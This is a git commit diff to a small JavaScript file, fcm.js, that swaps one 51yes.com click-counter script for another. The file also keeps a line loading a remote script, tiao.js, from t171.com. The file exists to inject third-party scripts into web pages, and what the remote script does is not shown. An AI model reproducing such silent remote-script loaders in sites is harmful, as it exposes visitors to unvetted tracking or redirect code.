64fa3af66d1d4f107f96e3c403d692024c3d0c8d
sadasd12 <sadasd12@outlook.com>
2015-12-11 16:47:05 +0800

    Update fcm.js

--- 66691f2f/fcm.js
+++ 66691f2f/fcm.js
@@ -1,3 +1,3 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count33.51yes.com\/click.aspx?id=334928503&logo=12\" charset=\"gb2312\"><\/script>");
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count1.51yes.com\/click.aspx?id=12912005&logo=12\" charset=\"gb2312\"><\/script>");
 
 document.writeln("<script src=http:\/\/\www.t171.com\/66691f2f/tiao.js ><\/script>");
